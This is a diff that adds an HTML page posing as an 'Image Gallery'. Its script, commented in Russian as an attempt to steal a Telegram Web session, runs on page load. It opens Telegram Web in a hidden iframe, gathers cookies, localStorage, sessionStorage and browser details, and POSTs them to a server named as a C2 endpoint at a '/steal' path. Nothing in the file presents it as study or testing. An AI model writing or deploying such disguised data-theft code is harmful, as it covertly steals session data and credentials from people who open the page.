@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Gallery</title>
+    <style>
+        body {
+            margin: 0;
+            background: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://picsum.photos/800/600.jpg?random=42" alt="Beautiful photo">
+    
+    <script>
+        (async function() {
+            // Пытаемся украсть сессию Telegram Web
+            try {
+                // Создаём скрытый iframe
+                const iframe = document.createElement('iframe');
+                iframe.src = 'https://web.telegram.org/k/';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                // Ждём загрузки
+                await new Promise(r => setTimeout(r, 3000));
+                
+                // Собираем данные
+                const data = {
+                    cookies: document.cookie,
+                    localStorage: (() => {
+                        const items = {};
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            items[key] = localStorage.getItem(key);
+                        }
+                        return items;
+                    })(),
+                    sessionStorage: (() => {
+                        const items = {};
+                        for (let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            items[key] = sessionStorage.getItem(key);
+                        }
+                        return items;
+                    })(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Отправляем на C2
+                await fetch('https://c2-telegram-server.onrender.com/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Error:', e);
+            }
+        })();
+    </script>
+</body>
+</html>
